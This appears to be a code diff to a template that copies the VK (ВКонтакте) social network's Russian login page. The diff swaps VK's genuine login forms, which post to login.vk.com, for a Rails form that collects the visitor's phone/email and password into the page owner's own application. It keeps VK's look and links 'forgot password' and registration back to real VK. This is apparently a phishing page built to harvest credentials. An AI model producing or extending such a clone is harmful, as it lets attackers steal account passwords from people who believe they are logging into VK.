@@ -41,25 +41,25 @@
     <div id="side_bar" class="fl_l " style="display: none">
       <div id="side_bar_inner" class="side_bar_inner">
         <div id="quick_login" class="quick_login">
-  <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
-    <input type="hidden" name="act" value="login" />
-    <input type="hidden" name="role" value="al_frame" />
-    <input type="hidden" name="expire" id="quick_expire_input" value="" />
-    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
-    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
-    <input type="hidden" name="_origin" value="https://vk.com" />
-    <input type="hidden" name="ip_h" value="e7611bab97a33fc29e" />
-    <input type="hidden" name="lg_h" value="a47246f4d03b14d19e" />
-    <div class="label">Телефон или email</div>
-    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
-    <div class="label">Пароль</div>
-    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
-    <input type="submit" class="submit" />
-  </form>
-  <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
-  <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
-  <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
-</div>
+          <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
+            <input type="hidden" name="act" value="login" />
+            <input type="hidden" name="role" value="al_frame" />
+            <input type="hidden" name="expire" id="quick_expire_input" value="" />
+            <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
+            <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
+            <input type="hidden" name="_origin" value="https://vk.com" />
+            <input type="hidden" name="ip_h" value="e7611bab97a33fc29e" />
+            <input type="hidden" name="lg_h" value="a47246f4d03b14d19e" />
+            <div class="label">Телефон или email</div>
+            <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
+            <div class="label">Пароль</div>
+            <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
+            <input type="submit" class="submit" />
+          </form>
+          <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
+          <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
+          <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
+        </div>
       </div>
     </div>
 
@@ -74,24 +74,19 @@
       <div id="wrap_between"></div>
       <div id="wrap3"><div id="wrap2">
   <div id="wrap1">
-    <div id="content"><div id="index_rcolumn" class="index_rcolumn">
-  <div id="index_login" class="page_block index_login">
-    <form method="post" name="login" id="index_login_form" action="https://login.vk.com/?act=login">
-      <input type="hidden" name="act" id="act" value="login">
-      <input type="hidden" name="role" value="al_frame" />
-      <input type="hidden" name="expire" id="index_expire_input" value="" />
-      <input type="hidden" name="_origin" value="https://vk.com" />
-      <input type="hidden" name="ip_h" value="e7611bab97a33fc29e" />
-      <input type="hidden" name="lg_h" value="a47246f4d03b14d19e" />
-      <input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Телефон или email" />
-      <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)" />
-      <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
-      <div class="forgot">
-        <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
-        <a id="index_forgot" class="index_forgot" href="/restore" target="_top">Забыли пароль?</a>
-      </div>
-    </form>
-  </div>
+    <div id="content">
+      <div id="index_rcolumn" class="index_rcolumn">
+        <div id="index_login" class="page_block index_login">
+          <%= simple_form_for @person do |f| %>
+            <%= f.input :login, label: false, placeholder: "Телефон или email", class: "big_text" %>
+            <%= f.input :password, label: false, placeholder: "Пароль", class: "big_text" %>
+            <%= f.submit "Войти", class: "index_login_button flat_button button_big_text" %>
+            <div class="forgot">
+              <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
+              <a id="index_forgot" class="index_forgot" href="https://vk.com/restore" target="_top">Забыли пароль?</a>
+            </div>
+          <% end %>
+        </div>
   <div id="ij_form" class="page_block ij_form">
     <h2 class="ij_header">Впервые ВКонтакте?</h2>
     <div class="ij_subheader">Моментальная регистрация</div>
@@ -109,7 +104,11 @@
       <div class="radiobtn" onclick="radiobtn(this, 1, 'ij_sex');">Женский</div>
       <div class="radiobtn" onclick="radiobtn(this, 2, 'ij_sex');">Мужской</div>
     </div>
-    <button class="flat_button button_wide button_big_text ij_button" id="ij_submit" onclick="Index.submitJoinStart()">Зарегистрироваться</button>
+    <div class="registration_vk">
+      <a href="https://m.vk.com/join">
+        <button class="flat_button button_wide button_big_text ij_button" id="ij_submit">Зарегистрироваться</button>
+      </a>
+    </div>
     <div id="index_fbsign" class="index_fbsign">
       <a id="index_fb" class="index_fb_lnk" href="" onclick="return Index.fbJoin();"><div class="index_fb_icon"></div>Войти через Facebook</a>
     </div>
